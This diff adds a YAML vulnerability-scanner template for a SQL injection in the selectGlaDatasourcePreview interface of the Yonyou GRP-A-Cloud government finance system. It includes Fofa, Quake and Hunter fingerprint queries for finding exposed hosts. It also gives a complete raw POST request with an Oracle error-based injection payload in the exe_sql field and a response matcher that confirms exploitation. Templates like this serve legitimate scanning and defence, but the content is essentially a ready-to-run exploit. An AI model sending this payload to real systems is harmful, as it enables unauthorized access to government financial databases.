@@ -1,0 +1,38 @@
+id: Yonyou_GRP_Cloud_selectGlaDatasourcePreview_SQLi
+
+info:
+  name: Yonyou_GRP_Cloud_selectGlaDatasourcePreview_SQLi
+  author: HK
+  severity: high
+  description: 用友GRP-A-Cloud政府财务云系统接口selectGlaDatasourcePreview存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="/pf/portal/login/css/fonts/style.css"
+    Quake-query: body="/pf/portal/login/css/fonts/style.css"
+    Hunter-query: body="/pf/portal/login/css/fonts/style.css"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    X-Requested-With: XMLHttpRequest
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Length: 279
+
+    exe_sql=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (2867=2867) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - qzkjq1qbvkq
